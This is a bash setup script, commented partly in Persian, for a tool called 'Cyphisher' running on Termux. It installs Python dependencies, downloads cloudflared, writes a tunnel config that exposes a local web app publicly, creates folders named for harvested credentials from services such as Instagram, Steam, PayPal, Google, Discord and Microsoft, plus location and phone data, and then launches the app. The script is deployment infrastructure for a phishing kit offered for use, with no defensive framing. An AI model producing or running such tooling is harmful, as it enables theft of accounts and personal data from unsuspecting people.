#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux Complete Fix
# ===============================

AUTO_CF="${AUTO_CF:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
CF_DIR="cloud_flare"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تابع برای رفع مشکل certificate و DNS
fix_system_issues() {
    log "🔧 Fixing system issues..."
    
    # نصب ca-certificates برای رفع مشکل certificate
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg install -y ca-certificates 2>/dev/null || true
        update-ca-certificates 2>/dev/null || true
    fi
    
    # تنظیم DNS سرورهای معتبر
    if [ -w "$PREFIX/etc/resolv.conf" ]; then
        echo "nameserver 8.8.8.8" > $PREFIX/etc/resolv.conf
        echo "nameserver 1.1.1.1" >> $PREFIX/etc/resolv.conf
        echo "nameserver 208.67.222.222" >> $PREFIX/etc/resolv.conf
        log "✅ DNS servers configured"
    fi
    
    # تست اتصال به Cloudflare
    log "📡 Testing connection to Cloudflare..."
    if ping -c 2 -W 3 api.trycloudflare.com >/dev/null 2>&1; then
        log "✅ Connection test successful"
    else
        log "⚠️ Connection test failed, but continuing..."
    fi
    
    log "✅ System issues fixed"
}

# پاکسازی کامل cloudflared قبلی
cleanup_old_cloudflared() {
    log "🧹 Cleaning up previous cloudflared installations..."
    
    rm -f "${CF_DIR}/cloudflared" 2>/dev/null || true
    rm -f "${CF_DIR}/cloudflared.exe" 2>/dev/null || true
    rm -f "cloudflared" 2>/dev/null || true
    rm -f "cloudflared.exe" 2>/dev/null || true
    rm -f "cloudflared.log" "cloudflared_url.txt" "app.pid" "cf.pid" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# نصب پایتون و ابزارهای لازم
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget ca-certificates -y
    else
        log "Please install Python and Git manually for your system"
        return 1
    fi
}

# ایجاد محیط مجازی پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
        log "✅ Virtual environment created"
    fi
    
    if [ -f "${VENV_DIR}/bin/activate" ]; then
        source "${VENV_DIR}/bin/activate"
    else
        error "Could not activate virtual environment"
        return 1
    fi
    
    pip install --upgrade pip
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt
        log "✅ Requirements installed"
    else
        pip install rich pyfiglet requests flask
        log "✅ Basic packages installed"
    fi
    
    log "✅ Python environment ready"
}

# دانلود cloudflared با رفع مشکلات احتمالی
download_cloudflared_guaranteed() {
    log "🌐 Downloading cloudflared for Termux..."
    
    mkdir -p "$CF_DIR"
    
    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    OUTPUT_FILE="${CF_DIR}/cloudflared"
    
    rm -f "$OUTPUT_FILE" 2>/dev/null || true
    
    if command -v curl >/dev/null 2>&1; then
        log "🔻 Using curl for download..."
        if ! curl -L --progress-bar -o "$OUTPUT_FILE" "$URL"; then
            log "🔄 Trying alternative download mirror..."
            curl -L --progress-bar -o "$OUTPUT_FILE" "https://cdn.cloudflare.com/cloudflared/releases/latest/cloudflared-linux-arm64"
        fi
    elif command -v wget >/dev/null 2>&1; then
        log "🔻 Using wget for download..."
        if ! wget -O "$OUTPUT_FILE" "$URL"; then
            log "🔄 Trying alternative download mirror..."
            wget -O "$OUTPUT_FILE" "https://cdn.cloudflare.com/cloudflared/releases/latest/cloudflared-linux-arm64"
        fi
    else
        error "❌ Neither curl nor wget available"
        return 1
    fi
    
    chmod +x "$OUTPUT_FILE"
    export PATH="$CF_DIR:$PATH"
    
    log "✅ cloudflared downloaded and executable"
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    log "✅ Directories created"
}

# ایجاد فایل پیکربندی برای cloudflared
create_cloudflared_config() {
    log "⚙️ Creating cloudflared configuration..."
    
    local config_file="${CF_DIR}/config.yml"
    
    cat > "$config_file" << EOF
# Cloudflared configuration for Cyphisher
tunnel: cyphisher-tunnel
credentials-file: ${CF_DIR}/credentials.json

ingress:
  - hostname: cyphisher.localhost
    service: http://localhost:${PORT}
  - service: http_status:404

warp-routing:
  enabled: false

originRequest:
  noTLSVerify: true
  connectTimeout: 30s
  tlsTimeout: 10s
  tcpKeepAlive: 30s
  noHappyEyeballs: false
  keepAliveConnections: 10
  keepAliveTimeout: 1m30s

logging:
  level: info
  format: json
EOF

    log "✅ Cloudflared configuration created"
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux..."
    
    detect_platform
    
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is optimized for Termux only"
        exit 1
    fi
    
    fix_system_issues
    cleanup_old_cloudflared
    install_dependencies
    setup_python_env
    
    if [ "$AUTO_CF" = "1" ]; then
        download_cloudflared_guaranteed
        create_cloudflared_config
    fi
    
    create_directories
    
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    
    log "🚀 Starting application in 3 seconds..."
    sleep 3
    
    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
        clear
        log "🏁 Launching Cyphisher..."
        export CLOUDFLARED_PATH="${CF_DIR}/cloudflared"
        exec "$PYTHON_BIN" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
